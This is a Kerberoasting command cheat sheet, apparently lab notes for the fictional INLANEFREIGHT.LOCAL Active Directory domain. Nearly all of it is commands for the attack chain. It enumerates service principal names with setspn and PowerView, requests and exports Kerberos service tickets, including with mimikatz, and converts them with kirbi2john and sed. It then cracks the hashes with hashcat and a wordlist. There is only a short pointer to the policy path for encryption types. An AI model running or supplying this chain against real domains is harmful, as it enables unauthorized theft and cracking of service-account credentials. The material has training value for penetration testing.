

Enumerate SPN's via setspn
```cmd-session
setspn.exe -Q */*
```

Request All Tickets via setspn
```powershell-session
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Request TGS for User Account
```powershell-session
Add-Type -AssemblyName System.IdentityModel
```
```powershell-session
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Request TGS for User Account via powershell
```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```


Extracting Tickets with mimikatz
```cmd-session
mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export
```
Converting mimikatz base64 blob for cracking
```shell-session
echo "<base64 blob>" |  tr -d \\n
```

Convert base64 file to kirbi file
```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

Extracting kirbi with john
```shell-session
python2.7 kirbi2john.py sqldev.kirbi
```

Convert kirbi for hashcat from john format
```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Cracking kirbi with hashcat
```shell-session
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.tx
```

Request tickets with powershell
```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

Extracting tickets to csv files
```powershell-session
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Check for encryption type 0 = rc4 24 = aes
```powershell-session
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Path to supported encryption types
```Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options```


